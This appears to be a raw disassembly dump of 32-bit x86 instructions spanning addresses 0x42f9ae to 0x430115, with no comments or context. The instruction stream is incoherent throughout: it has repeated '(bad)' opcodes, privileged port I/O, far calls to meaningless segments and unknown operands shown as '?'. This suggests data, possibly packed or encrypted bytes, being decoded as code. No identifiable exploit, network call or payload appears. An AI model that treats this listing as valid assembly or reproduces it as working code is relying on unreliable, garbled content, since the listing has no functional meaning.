  42f9ae:	pop    ecx
  42f9af:	in     eax,0x4b
  42f9b1:	sbb    esi,DWORD PTR [esp+edx*1-0x5b61e08c]
  42f9b8:	test   DWORD PTR [esi],edi
  42f9ba:	or     ebp,ebp
  42f9bc:	fild   WORD PTR [ecx-0x22]
  42f9bf:	and    BYTE PTR fs:[ecx-0x6d],bl
  42f9c3:	adc    DWORD PTR [eax-0x36],ecx
  42f9c6:	jne    0x42f9e2
  42f9c8:	cmp    esp,DWORD PTR [edi-0x61d6d9a5]
  42f9ce:	push   ebx
  42f9cf:	loopne 0x42fa43
  42f9d1:	mov    ah,0xb8
  42f9d3:	sub    edx,DWORD PTR [eax+ebp*1+0x664d45ab]
  42f9da:	lock out dx,al
  42f9dc:	hlt    
  42f9dd:	scas   eax,DWORD PTR es:[edi]
  42f9de:	jnp    0x42f985
  42f9e0:	cmp    dh,ch
  42f9e2:	ja     0x42f99b
  42f9e4:	in     al,dx
  42f9e5:	shl    BYTE PTR [edi],1
  42f9e7:	imul   esi,ebx,0xddc3bf88
  42f9ed:	xor    edi,DWORD PTR [esi+0x5cf88e84]
  42f9f3:	mov    bh,0xb6
  42f9f5:	sbb    bl,bl
  42f9f7:	les    esi,FWORD PTR [esi-0x7ad0c9ab]
  42f9fd:	jne    0x42f9e7
  42f9ff:	out    dx,eax
  42fa00:	into   
  42fa01:	repnz std 
  42fa03:	pop    esi
  42fa04:	int3   
  42fa05:	in     al,0xb4
  42fa07:	test   BYTE PTR [ebp+0x3c],dl
  42fa0a:	test   BYTE PTR [esi-0x6a],dl
  42fa0d:	jg     0x42fa00
  42fa0f:	aam    0x18
  42fa11:	arpl   WORD PTR [edi+0x7e],ax
  42fa14:	add    dh,BYTE PTR [edx-0x4f]
  42fa17:	inc    ebx
  42fa18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa19:	sbb    DWORD PTR [esi-0x15e7c2cc],edi
  42fa1f:	sub    ch,ah
  42fa21:	cdq    
  42fa22:	enter  0xac5a,0x7
  42fa26:	or     al,0xe6
  42fa28:	pop    ds
  42fa29:	or     DWORD PTR [eax+ebx*8-0x1739e8ce],esp
  42fa30:	retf   
  42fa31:	cdq    
  42fa32:	retf   
  42fa33:	leave  
  42fa34:	pop    ecx
  42fa35:	mov    ?,WORD PTR [edx+0x65c4b26e]
  42fa3b:	sar    eax,1
  42fa3d:	leave  
  42fa3e:	jg     0x42fa34
  42fa40:	jns    0x42f9f6
  42fa42:	add    ebx,DWORD PTR [ecx]
  42fa44:	mov    esp,0x23ee0069
  42fa49:	mov    bh,0xc5
  42fa4b:	jb     0x42fab2
  42fa4d:	in     al,0x68
  42fa4f:	hlt    
  42fa50:	sub    DWORD PTR [eax+0x3916a61a],0x8408e592
  42fa5a:	sbb    esi,edi
  42fa5c:	fcomp  DWORD PTR [esi-0x218e9045]
  42fa62:	dec    eax
  42fa63:	xor    ecx,DWORD PTR [ebp-0x64]
  42fa66:	daa    
  42fa67:	(bad)  
  42fa68:	in     al,dx
  42fa69:	mov    eax,0xdc7a4b7
  42fa6e:	push   ecx
  42fa6f:	mov    ebp,0xf2d782f5
  42fa74:	addr16 xor eax,0xe9164210
  42fa7a:	and    DWORD PTR [edi+ebp*8],esi
  42fa7d:	mov    ebp,0xafde500d
  42fa82:	sbb    ebp,DWORD PTR [esi+ebx*8]
  42fa85:	out    dx,al
  42fa86:	pop    edx
  42fa87:	mov    dl,0x36
  42fa89:	sbb    eax,ebp
  42fa8b:	mov    eax,ds:0x5e662eda
  42fa90:	adc    BYTE PTR gs:[ecx+0x724be6f0],dh
  42fa97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa98:	aad    0x6a
  42fa9a:	push   eax
  42fa9b:	jmp    0xd5827db2
  42faa0:	adc    eax,0x371701ad
  42faa5:	nop
  42faa6:	and    dh,cl
  42faa8:	nop
  42faa9:	xchg   ebx,eax
  42faaa:	mov    cl,0x0
  42faac:	or     esp,DWORD PTR [ebx+edi*8-0x303e2a54]
  42fab3:	je     0x42facb
  42fab5:	pop    es
  42fab6:	add    ebx,DWORD PTR [ebx]
  42fab8:	push   ss
  42fab9:	cdq    
  42faba:	cmp    BYTE PTR [ebx-0x3ae41059],al
  42fac0:	push   ebp
  42fac1:	retf   0x6bfb
  42fac4:	sub    eax,0x1f73ce5e
  42fac9:	enter  0x522c,0x19
  42facd:	or     edx,esp
  42facf:	adc    al,bl
  42fad1:	fmulp  st(2),st
  42fad3:	sub    esi,ebx
  42fad5:	leave  
  42fad6:	or     ch,0xf6
  42fad9:	jmp    0x42fb2c
  42fadb:	add    ebx,edx
  42fadd:	idiv   esi
  42fadf:	xchg   esi,eax
  42fae0:	mov    ds:0xf46cd855,eax
  42fae5:	test   al,0xbd
  42fae7:	adc    al,0x68
  42fae9:	test   DWORD PTR [esi-0x19489aad],eax
  42faef:	neg    DWORD PTR [esi]
  42faf1:	enter  0xa942,0x68
  42faf5:	pop    eax
  42faf6:	fucom  st(6)
  42faf8:	push   es
  42faf9:	or     esp,0x8af50964
  42faff:	(bad)  
  42fb00:	mov    fs,WORD PTR [ebp+0x46cbd7bb]
  42fb06:	jge    0x42fb7e
  42fb08:	sub    dl,al
  42fb0a:	dec    edx
  42fb0b:	fmul   DWORD PTR [edx]
  42fb0d:	fisub  DWORD PTR [edi]
  42fb0f:	push   ebp
  42fb10:	and    BYTE PTR ds:0x5d69358b,bl
  42fb16:	pop    ebx
  42fb17:	stos   DWORD PTR es:[edi],eax
  42fb18:	xchg   ebp,eax
  42fb19:	mov    dh,0x8a
  42fb1b:	icebp  
  42fb1c:	xchg   ebx,eax
  42fb1d:	push   ebx
  42fb1e:	jo     0x42fae4
  42fb20:	sbb    ebp,ecx
  42fb22:	adc    BYTE PTR [ebx],al
  42fb24:	into   
  42fb25:	sbb    DWORD PTR [esi+0x2b9f361a],ebp
  42fb2b:	cmp    al,0x51
  42fb2d:	fisubr WORD PTR [ebx-0x12]
  42fb30:	call   0x261d:0xc129727
  42fb37:	jne    0x42fb4f
  42fb39:	add    eax,0xcce0e7f4
  42fb3e:	add    cl,BYTE PTR [edi-0x23eaaab]
  42fb44:	pop    ebp
  42fb45:	and    ebp,DWORD PTR [ebp+0x70f74216]
  42fb4b:	sub    eax,0x352db9e2
  42fb50:	and    DWORD PTR [eax-0x39],esi
  42fb53:	clc    
  42fb54:	mov    bl,BYTE PTR [edi+0x5f3bb9cb]
  42fb5a:	in     al,0x99
  42fb5c:	popf   
  42fb5d:	cmp    al,0x4b
  42fb5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb60:	sbb    ecx,ecx
  42fb62:	xor    cl,ah
  42fb64:	add    eax,0x62248b1a
  42fb69:	scas   eax,DWORD PTR es:[edi]
  42fb6a:	sbb    ebx,esi
  42fb6c:	fmul   DWORD PTR [eax]
  42fb6e:	jo     0x42fbd3
  42fb70:	adc    ah,BYTE PTR [edi]
  42fb72:	call   0x5d8e:0x563922d4
  42fb79:	jb     0x42fbbf
  42fb7b:	dec    esp
  42fb7c:	aam    0x9d
  42fb7e:	or     edx,DWORD PTR [esi+0x31]
  42fb81:	push   edi
  42fb82:	es nop
  42fb84:	mov    al,0x67
  42fb86:	aas    
  42fb87:	xor    ebp,DWORD PTR [edi+0x19]
  42fb8a:	jge    0x42fbcf
  42fb8c:	mov    WORD PTR fs:[ebp-0x4b410814],?
  42fb93:	sub    al,0xd5
  42fb95:	out    0x1a,eax
  42fb97:	lock xchg ebx,eax
  42fb99:	adc    BYTE PTR [esi+0x2f8923c7],0xdb
  42fba0:	mov    eax,0xf1680b4a
  42fba5:	cmp    BYTE PTR [ebp+0x3a67ad3],0x6
  42fbac:	xchg   DWORD PTR [ebp+0x15],ebp
  42fbaf:	mov    ds:0x24522cd8,eax
  42fbb4:	cmc    
  42fbb5:	xor    DWORD PTR [eax],0x6c2260f4
  42fbbb:	cs (bad) 
  42fbbd:	ins    BYTE PTR es:[edi],dx
  42fbbe:	dec    eax
  42fbbf:	into   
  42fbc0:	mov    esp,0xdb485ba2
  42fbc5:	xlat   BYTE PTR ds:[ebx]
  42fbc6:	outs   dx,BYTE PTR ds:[esi]
  42fbc7:	push   edi
  42fbc8:	add    bh,BYTE PTR [ebx-0x74]
  42fbcb:	sub    DWORD PTR [esi],ebx
  42fbcd:	mov    cl,0xc7
  42fbcf:	pop    ebx
  42fbd0:	add    BYTE PTR [edi-0x71b7023a],bl
  42fbd6:	adc    eax,0x88d29551
  42fbdb:	icebp  
  42fbdc:	jmp    0xd3b38013
  42fbe1:	push   esp
  42fbe2:	mov    ah,0x44
  42fbe4:	xlat   BYTE PTR ds:[ebx]
  42fbe5:	shl    al,cl
  42fbe7:	popf   
  42fbe8:	xor    eax,0x9bf4968d
  42fbed:	out    dx,eax
  42fbee:	inc    eax
  42fbef:	imul   cl
  42fbf1:	push   0xfffffff0
  42fbf3:	xor    esi,DWORD PTR ds:0x3f926509
  42fbf9:	pop    es
  42fbfa:	pushf  
  42fbfb:	retf   0xa6a1
  42fbfe:	mov    ebx,0xe8b8eac2
  42fc03:	adc    al,0xd2
  42fc05:	sar    DWORD PTR gs:[eax-0x42],cl
  42fc09:	scas   al,BYTE PTR es:[edi]
  42fc0a:	retf   
  42fc0b:	aam    0x65
  42fc0d:	pop    edi
  42fc0e:	xchg   edx,eax
  42fc0f:	mov    DWORD PTR [ebx+ecx*8-0x4c352e05],0x33a415e9
  42fc1a:	pop    es
  42fc1b:	sub    ah,BYTE PTR [ebp-0x68738c62]
  42fc21:	inc    ecx
  42fc22:	xor    DWORD PTR [eax-0x43454888],ebp
  42fc28:	jo     0x42fbf4
  42fc2a:	mov    ebx,0xee06e847
  42fc2f:	sub    bh,BYTE PTR [ebp+0x1bcb7e18]
  42fc35:	mov    ch,0xec
  42fc37:	enter  0x2925,0xbc
  42fc3b:	dec    edi
  42fc3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fc3d:	or     eax,0xb97763e6
  42fc42:	mov    ds:0xbdfc9569,al
  42fc47:	out    dx,al
  42fc48:	out    dx,eax
  42fc49:	or     eax,0x591ce328
  42fc4e:	mov    eax,ds:0x7daf2a2d
  42fc53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fc54:	sar    bl,0x8d
  42fc57:	push   0xfb0b9dd8
  42fc5c:	mov    eax,0x29647830
  42fc61:	sub    DWORD PTR ds:0x8f70d5e3,ebx
  42fc67:	add    eax,0x11548618
  42fc6c:	test   esp,esi
  42fc6e:	jns    0x42fc58
  42fc70:	adc    ah,dl
  42fc72:	sbb    ch,dl
  42fc74:	mov    ?,WORD PTR [ecx-0x34]
  42fc77:	xchg   DWORD PTR ds:0xca65695f,esi
  42fc7d:	and    esi,DWORD PTR [ebp-0x3223a11]
  42fc83:	jmp    0x8919:0xfb6ff1dd
  42fc8a:	rol    bl,cl
  42fc8c:	push   0x4ffe7d90
  42fc91:	call   0x75a4:0x1f4b091b
  42fc98:	sub    ch,al
  42fc9a:	cmp    al,0x84
  42fc9c:	stos   BYTE PTR es:[edi],al
  42fc9d:	push   ebp
  42fc9e:	mov    bh,0xd4
  42fca0:	jno    0x42fce0
  42fca2:	mov    eax,ds:0x1ba1bd53
  42fca7:	dec    ebx
  42fca8:	in     eax,0xd9
  42fcaa:	mov    edx,0xa0898e78
  42fcaf:	(bad)  
  42fcb0:	(bad)  
  42fcb2:	xchg   ecx,eax
  42fcb3:	es sub eax,ebp
  42fcb6:	shl    BYTE PTR [eax-0x77],cl
  42fcb9:	je     0x42fc96
  42fcbb:	call   0xef21ea65
  42fcc0:	xchg   ah,cl
  42fcc2:	test   al,0xb1
  42fcc4:	sbb    eax,0x896a97b9
  42fcc9:	popf   
  42fcca:	and    bl,ch
  42fccc:	aas    
  42fccd:	in     al,0xb
  42fccf:	and    edx,DWORD PTR [edi]
  42fcd1:	mov    ah,0xd3
  42fcd3:	loope  0x42fc92
  42fcd5:	xchg   ebp,eax
  42fcd6:	and    dh,0x5b
  42fcd9:	pop    eax
  42fcda:	jo     0x42fd09
  42fcdc:	sbb    DWORD PTR [eax-0x4c],ebx
  42fcdf:	je     0x42fcb4
  42fce1:	out    0x47,eax
  42fce3:	xor    DWORD PTR [ebp+0x64f2a80b],esp
  42fce9:	dec    ecx
  42fcea:	mov    dl,0xf8
  42fcec:	sbb    bh,BYTE PTR [ecx+0x42]
  42fcef:	adc    edi,DWORD PTR [ebp-0x790ec7a1]
  42fcf5:	pushf  
  42fcf6:	dec    ebx
  42fcf7:	pop    edx
  42fcf8:	test   al,0xba
  42fcfa:	cmp    DWORD PTR [ebx-0x7fdfd870],ebx
  42fd00:	cmp    ch,ch
  42fd02:	xlat   BYTE PTR ds:[ebx]
  42fd03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd04:	test   cl,bh
  42fd06:	mov    bh,0x4
  42fd08:	or     ch,BYTE PTR [ecx+0x6c0398bb]
  42fd0e:	jmp    0x491:0xc9b87aa3
  42fd15:	nop
  42fd16:	call   0x21eb:0xaddba775
  42fd1d:	test   ebx,eax
  42fd1f:	(bad)  
  42fd20:	push   esp
  42fd21:	fwait
  42fd22:	stos   DWORD PTR es:[edi],eax
  42fd23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd24:	(bad)  
  42fd25:	sbb    al,0xc6
  42fd27:	push   ecx
  42fd28:	jne    0x42fd0b
  42fd2a:	fiadd  WORD PTR [eax]
  42fd2c:	mov    bh,0x27
  42fd2e:	pop    eax
  42fd2f:	cmp    DWORD PTR [esi],0x4c
  42fd32:	mov    dl,0x44
  42fd34:	mov    esi,0xbaf526ec
  42fd3a:	add    ah,dh
  42fd3c:	nop
  42fd3d:	jo     0x42fd30
  42fd3f:	dec    ebx
  42fd40:	push   0x4376d589
  42fd45:	xchg   di,ax
  42fd47:	and    edx,esi
  42fd49:	test   eax,0x81d2467
  42fd4e:	shr    eax,cl
  42fd50:	xchg   edx,eax
  42fd51:	pop    ecx
  42fd52:	sub    ebp,esi
  42fd54:	sti    
  42fd55:	mov    DWORD PTR [ebx],ebp
  42fd57:	and    al,0x6d
  42fd59:	jo     0x42fd18
  42fd5b:	pushf  
  42fd5c:	popa   
  42fd5d:	fwait
  42fd5e:	cmp    ebp,DWORD PTR [ebp-0x8]
  42fd61:	push   edx
  42fd62:	fcomp  QWORD PTR [edx+0x58f60b19]
  42fd68:	push   edx
  42fd69:	leave  
  42fd6a:	mov    ds:0x31eae9c,eax
  42fd6f:	sti    
  42fd70:	add    al,0xef
  42fd72:	add    eax,0x1684d670
  42fd77:	adc    bh,bh
  42fd79:	cmc    
  42fd7a:	xchg   edx,eax
  42fd7b:	and    al,0x84
  42fd7d:	cld    
  42fd7e:	out    0x2c,eax
  42fd80:	pop    edx
  42fd81:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd83:	out    dx,al
  42fd84:	in     eax,dx
  42fd85:	retf   0xe735
  42fd88:	and    dh,BYTE PTR ds:0xe575b1a8
  42fd8e:	lahf   
  42fd8f:	nop
  42fd90:	pop    ss
  42fd91:	or     bl,bh
  42fd93:	pop    ss
  42fd94:	adc    eax,0x7dee842d
  42fd99:	int3   
  42fd9a:	test   al,0xf9
  42fd9c:	sub    ebx,DWORD PTR [edx+esi*4-0x31b1e7cc]
  42fda3:	out    dx,eax
  42fda4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fda5:	dec    ebp
  42fda6:	jbe    0x42fd9c
  42fda8:	pushf  
  42fda9:	or     ecx,DWORD PTR [edx+0x64]
  42fdac:	xchg   ebx,eax
  42fdad:	mov    ecx,0xe48f60c6
  42fdb2:	ins    DWORD PTR es:[edi],dx
  42fdb3:	jecxz  0x42fdd7
  42fdb5:	sar    DWORD PTR [ebx+eiz*4+0x625cf9d6],0x52
  42fdbd:	test   ch,dh
  42fdbf:	dec    edx
  42fdc0:	and    al,0xb9
  42fdc2:	repnz jecxz 0x42fe28
  42fdc5:	sahf   
  42fdc6:	mov    ah,0xe8
  42fdc8:	out    dx,al
  42fdc9:	cli    
  42fdca:	or     eax,0xe74919f5
  42fdcf:	cld    
  42fdd0:	push   ds
  42fdd1:	xor    BYTE PTR [ebx+0x25],bl
  42fdd4:	push   esp
  42fdd5:	lahf   
  42fdd6:	fwait
  42fdd7:	jmp    0x7fbedeb0
  42fddc:	jmp    0xcaaef2b9
  42fde1:	cmp    BYTE PTR [eiz*2+0x36db021b],ah
  42fde8:	mov    DWORD PTR [edi-0x18c83e65],ebx
  42fdee:	inc    eax
  42fdef:	mov    ch,0x8
  42fdf1:	add    al,0x6d
  42fdf3:	(bad)  
  42fdf4:	das    
  42fdf5:	mov    dl,0x28
  42fdf7:	test   DWORD PTR [esi+edx*4],esp
  42fdfa:	aaa    
  42fdfb:	popa   
  42fdfc:	dec    esi
  42fdfd:	mov    ch,0x4b
  42fdff:	or     BYTE PTR [ecx],cl
  42fe01:	or     cl,BYTE PTR [eax-0x12]
  42fe04:	inc    edi
  42fe05:	(bad)  
  42fe06:	(bad)  [edx]
  42fe08:	cli    
  42fe09:	pop    esp
  42fe0a:	mov    ebx,0xa3d0f5b6
  42fe0f:	mov    ds:0x34be116a,al
  42fe14:	fcmovnbe st,st(7)
  42fe16:	dec    edi
  42fe17:	and    dh,BYTE PTR [edi+0x34]
  42fe1a:	(bad)  
  42fe1b:	fcom   DWORD PTR [ebp-0x7]
  42fe1e:	adc    ch,BYTE PTR [edx-0x25]
  42fe21:	jg     0x42fe04
  42fe23:	ins    DWORD PTR es:[edi],dx
  42fe24:	cs jp  0x42fe5b
  42fe27:	ret    0xa5de
  42fe2a:	mov    ah,0x34
  42fe2c:	rol    DWORD PTR [edx],cl
  42fe2e:	mov    dl,0xb3
  42fe30:	xchg   esi,eax
  42fe31:	or     BYTE PTR [esi+0x15],0x46
  42fe35:	rol    BYTE PTR [ecx],0x65
  42fe38:	mov    ebx,0xf10ebbf9
  42fe3d:	add    ch,0x84
  42fe40:	dec    ecx
  42fe41:	into   
  42fe42:	icebp  
  42fe43:	arpl   WORD PTR [edi-0x36],di
  42fe46:	mov    ebx,0x1a552626
  42fe4b:	loope  0x42fdef
  42fe4d:	xchg   esi,eax
  42fe4e:	sahf   
  42fe4f:	cmp    edi,DWORD PTR [ebx-0x590ea164]
  42fe55:	jns    0x42fe73
  42fe57:	add    al,0xd7
  42fe59:	mov    dh,0x52
  42fe5b:	das    
  42fe5c:	(bad)  
  42fe5d:	repz cmp eax,DWORD PTR [edx]
  42fe60:	stos   BYTE PTR es:[edi],al
  42fe61:	ss es pop ebp
  42fe64:	lea    ebp,[esi]
  42fe66:	and    esp,esi
  42fe68:	mov    eax,ds:0x3bf68190
  42fe6d:	adc    dl,ah
  42fe6f:	test   BYTE PTR [edx],al
  42fe71:	push   ds
  42fe72:	fwait
  42fe73:	mov    ah,0x90
  42fe75:	pushf  
  42fe76:	fwait
  42fe77:	aas    
  42fe78:	loop   0x42fe1c
  42fe7a:	mov    al,ds:0xf9e7befc
  42fe7f:	test   al,0x1d
  42fe81:	jns    0x42fe3f
  42fe83:	fwait
  42fe84:	cmp    BYTE PTR [ebp+0x4f],ch
  42fe87:	sbb    BYTE PTR [esp+ebx*4+0x5b],ah
  42fe8b:	gs in  eax,dx
  42fe8d:	in     eax,0x9d
  42fe8f:	jmp    0x42fe70
  42fe91:	fstp   DWORD PTR [esp+eax*4-0x1b406376]
  42fe98:	or     BYTE PTR [ecx+0x29],dl
  42fe9b:	push   esi
  42fe9c:	data16 clc 
  42fe9e:	pop    ebp
  42fe9f:	bound  edx,QWORD PTR [eax-0x5d]
  42fea2:	mul    DWORD PTR [edx-0x42ac2a90]
  42fea8:	xor    BYTE PTR [ebx+0xaf4e55e],ah
  42feae:	cli    
  42feaf:	leave  
  42feb0:	sub    ah,dh
  42feb2:	mov    edi,0xed8cd5d0
  42feb7:	and    bl,dl
  42feb9:	sahf   
  42feba:	xlat   BYTE PTR ds:[ebx]
  42febb:	test   eax,0xf466375a
  42fec0:	inc    ecx
  42fec1:	clc    
  42fec2:	dec    ebx
  42fec3:	xchg   BYTE PTR [esi],cl
  42fec5:	adc    BYTE PTR [ebp+0x4b366d16],0xe8
  42fecc:	lea    edx,[edi+0x5f]
  42fecf:	jae    0x42ff08
  42fed1:	retf   
  42fed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fed3:	shr    DWORD PTR [ebp+0x6f],1
  42fed6:	sub    eax,0x79e581fc
  42fedb:	sub    al,0x25
  42fedd:	leave  
  42fede:	fstp   TBYTE PTR [ecx+0x1efd690e]
  42fee4:	sbb    ch,bh
  42fee6:	xor    ch,BYTE PTR ds:0xe6ef2cf5
  42feec:	cmp    ebx,ebx
  42feee:	repnz dec ebp
  42fef0:	xor    ebp,DWORD PTR [ecx+0x27]
  42fef3:	pop    edi
  42fef4:	mov    eax,ds:0xdf15cb6b
  42fef9:	daa    
  42fefa:	pusha  
  42fefb:	aam    0xd5
  42fefd:	scas   al,BYTE PTR es:[edi]
  42fefe:	dec    ebx
  42feff:	in     al,dx
  42ff00:	mov    bl,0xb4
  42ff02:	mov    dl,0x20
  42ff04:	and    al,0x99
  42ff06:	cmp    dh,BYTE PTR [esi-0x5e]
  42ff09:	push   cs
  42ff0a:	inc    ebp
  42ff0b:	retf   
  42ff0c:	cmp    bh,BYTE PTR [esi+0x4c]
  42ff0f:	(bad)  
  42ff11:	in     al,dx
  42ff12:	jmp    0x2ef8:0xb367ca24
  42ff19:	or     DWORD PTR [ebp-0x7b6d75e4],ebx
  42ff1f:	jl     0x42ff39
  42ff21:	jne    0x42febd
  42ff23:	push   ds
  42ff24:	aad    0x9a
  42ff26:	xor    dh,ah
  42ff28:	stc    
  42ff29:	mov    eax,ds:0x5da1b192
  42ff2e:	test   al,0xea
  42ff30:	mov    ch,0x7d
  42ff32:	pop    ds
  42ff33:	repz mov ss,WORD PTR [ecx]
  42ff36:	clc    
  42ff37:	dec    eax
  42ff38:	xchg   ebp,eax
  42ff39:	daa    
  42ff3a:	jp     0x42febe
  42ff3c:	jne    0x42fedd
  42ff3e:	sbb    eax,DWORD PTR [ebx-0x7a]
  42ff41:	shr    DWORD PTR [ebp+0x7d4ed9e9],cl
  42ff47:	iret   
  42ff48:	repz xor al,0xce
  42ff4b:	add    al,0x9e
  42ff4d:	mov    edi,0x9c1b2789
  42ff52:	mov    ebx,0x4ed6f277
  42ff57:	(bad)  
  42ff58:	aam    0xe9
  42ff5a:	push   0xb860d7eb
  42ff5f:	hlt    
  42ff60:	jne    0x42fef4
  42ff62:	pop    ebp
  42ff63:	faddp  st(5),st
  42ff65:	adc    ch,cl
  42ff67:	icebp  
  42ff68:	and    BYTE PTR [ebx],al
  42ff6a:	adc    BYTE PTR [ebp+0x60ede85d],bh
  42ff70:	xchg   DWORD PTR [ebp-0x49],eax
  42ff73:	add    al,0x58
  42ff75:	fcomp  DWORD PTR ds:0x5a4815ec
  42ff7b:	icebp  
  42ff7c:	inc    esi
  42ff7d:	ror    BYTE PTR [ebx],0xed
  42ff80:	adc    DWORD PTR [edx],edi
  42ff82:	push   ecx
  42ff83:	les    ecx,FWORD PTR [ebx-0x3e]
  42ff86:	xchg   ecx,eax
  42ff87:	in     al,0x99
  42ff89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ff8a:	xchg   edi,eax
  42ff8b:	retf   
  42ff8c:	jo     0x42ff2e
  42ff8e:	sbb    esi,DWORD PTR [esi]
  42ff90:	inc    ebp
  42ff91:	(bad)  
  42ff92:	in     eax,dx
  42ff93:	outs   dx,BYTE PTR ds:[esi]
  42ff94:	mov    WORD PTR [esp+edx*1],gs
  42ff97:	xchg   ecx,eax
  42ff98:	test   DWORD PTR [esi],esp
  42ff9a:	enter  0xab34,0x5d
  42ff9e:	popf   
  42ff9f:	ret    
  42ffa0:	in     eax,0x27
  42ffa2:	in     eax,0x68
  42ffa4:	pop    eax
  42ffa5:	mov    DWORD PTR [edx+edi*4+0x4c],ebp
  42ffa9:	lods   eax,DWORD PTR ds:[esi]
  42ffaa:	jp     0x42ffc3
  42ffac:	lds    edi,FWORD PTR [edi]
  42ffae:	mov    esi,0x8c591d8a
  42ffb3:	sar    DWORD PTR [ebx],1
  42ffb5:	mov    ecx,0x525d61ff
  42ffba:	mov    edi,0xf1dc1ce7
  42ffbf:	mov    al,0x3a
  42ffc1:	(bad)  [ebx-0x42e16554]
  42ffc7:	push   esp
  42ffc8:	retf   0x8875
  42ffcb:	xlat   BYTE PTR ds:[ebx]
  42ffcc:	gs dec ecx
  42ffce:	xchg   esi,eax
  42ffcf:	call   0x2eba3eac
  42ffd4:	jl     0x42ffa6
  42ffd6:	sbb    BYTE PTR [esi+0x24baca53],ch
  42ffdc:	pop    ds
  42ffdd:	or     al,BYTE PTR [eax+0x6beb452e]
  42ffe3:	out    dx,al
  42ffe4:	xchg   esi,eax
  42ffe6:	in     eax,0xc4
  42ffe8:	pop    ds
  42ffe9:	cmp    DWORD PTR [edx-0x29feada6],eax
  42ffef:	sbb    esp,ecx
  42fff1:	je     0x42fffa
  42fff3:	mov    esp,0x4b3e8b1
  42fff8:	sahf   
  42fff9:	cwde   
  42fffa:	imul   edx,DWORD PTR [ebx+0x36851a91],0x64b75662
  430004:	rcr    BYTE PTR [ecx-0x758bc785],cl
  43000a:	pop    eax
  43000b:	(bad)  
  43000c:	adc    ch,BYTE PTR [ecx]
  43000e:	lods   eax,DWORD PTR ds:[esi]
  43000f:	pop    ebx
  430010:	and    ebp,ecx
  430012:	retf   
  430013:	jmp    0x42ffa8
  430015:	cli    
  430016:	inc    esi
  430017:	mul    DWORD PTR [eax-0x5b]
  43001a:	retf   
  43001b:	icebp  
  43001c:	js     0x43008d
  43001e:	stos   BYTE PTR es:[edi],al
  43001f:	(bad)
  430023:	out    0x7e,al
  430025:	dec    eax
  430026:	mov    edi,0xb716491f
  43002b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43002c:	iret   
  43002d:	ret    0x3eb2
  430030:	jbe    0x430063
  430032:	and    eax,0x279f7634
  430037:	pop    cx
  430039:	jno    0x43009d
  43003b:	call   DWORD PTR [ebx]
  43003d:	outs   dx,BYTE PTR ds:[esi]
  43003e:	mov    dh,0x24
  430040:	inc    edx
  430041:	jbe    0x4300c0
  430043:	sti    
  430044:	add    eax,0x9aef1b5c
  430049:	mov    DWORD PTR ds:0xd8691fea,eax
  43004f:	pop    ebx
  430050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430051:	pop    ebp
  430052:	push   ss
  430053:	je     0x43006e
  430055:	lock mov esi,edx
  430058:	xchg   ebx,eax
  430059:	push   es
  43005a:	push   0x4d
  43005c:	xchg   ecx,eax
  43005d:	popa   
  43005e:	dec    ebp
  43005f:	out    0xc1,al
  430061:	adc    BYTE PTR [edx-0x42c18834],al
  430067:	xchg   esp,eax
  430068:	mov    edi,DWORD PTR [eax+0x34e55528]
  43006e:	outs   dx,DWORD PTR ds:[esi]
  43006f:	in     al,dx
  430070:	in     eax,dx
  430071:	shl    BYTE PTR [esi-0x6c],0xbb
  430075:	pop    ss
  430076:	push   0xb3c91f7e
  43007b:	arpl   WORD PTR [eax+esi*4+0xe],bp
  43007f:	sbb    bl,BYTE PTR [edi+0x23]
  430082:	out    dx,eax
  430083:	jg     0x430090
  430085:	test   eax,0x22bdc49b
  43008a:	adc    BYTE PTR [edi+0x48],bh
  43008d:	fbld   TBYTE PTR [eax-0x43ed86c8]
  430093:	hlt    
  430094:	repnz icebp 
  430096:	rcr    DWORD PTR [ebp-0x1e452779],cl
  43009c:	sub    DWORD PTR [ebx+0x53],esp
  43009f:	jmp    0x4300b2
  4300a1:	jae    0x4300c6
  4300a3:	mov    ah,BYTE PTR [ebp+0x5]
  4300a6:	mov    esi,0x10a14d64
  4300ab:	cmp    DWORD PTR [ecx+0x11],0xfffffff2
  4300af:	aam    0x79
  4300b1:	jge    0x430093
  4300b3:	shr    DWORD PTR [eax-0x6f9183cb],cl
  4300b9:	stc    
  4300ba:	outs   dx,DWORD PTR ds:[esi]
  4300bb:	out    0x3a,eax
  4300bd:	inc    edi
  4300be:	in     al,dx
  4300bf:	in     al,dx
  4300c0:	push   ss
  4300c1:	leave  
  4300c2:	stc    
  4300c3:	jno    0x430074
  4300c5:	mov    bl,0x83
  4300c7:	mov    dl,0xf0
  4300c9:	pushf  
  4300ca:	jmp    0x430065
  4300cc:	xor    bh,0xe7
  4300cf:	xor    bl,bl
  4300d1:	dec    eax
  4300d2:	gs jmp 0x43006c
  4300d5:	data16 mov dl,0xa4
  4300d8:	mov    eax,0xd528b60b
  4300dd:	pop    esi
  4300de:	pop    ds
  4300df:	jmp    0x4300ef
  4300e1:	sub    bh,BYTE PTR [edx]
  4300e3:	mov    ah,0x1f
  4300e5:	sbb    DWORD PTR [edx],esi
  4300e7:	xlat   BYTE PTR ds:[ebx]
  4300e8:	push   ebx
  4300e9:	inc    edi
  4300ea:	shl    ebp,0x91
  4300ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4300ee:	sbb    edi,DWORD PTR [ecx]
  4300f0:	cs out dx,eax
  4300f2:	ins    DWORD PTR es:[edi],dx
  4300f3:	enter  0x7b08,0x78
  4300f7:	mov    al,0xb
  4300f9:	mov    esp,0x581fd4b3
  4300fe:	sti    
  4300ff:	mov    ch,0xe6
  430101:	mov    bl,0x26
  430103:	in     al,0x1e
  430105:	jnp    0x430119
  430107:	test   BYTE PTR ds:0xcb2006e7,al
  43010d:	popa   
  43010e:	mov    eax,0x15998cd4
  430113:	push   ecx
  430114:	push   esi
  430115:	mov    al,0xae
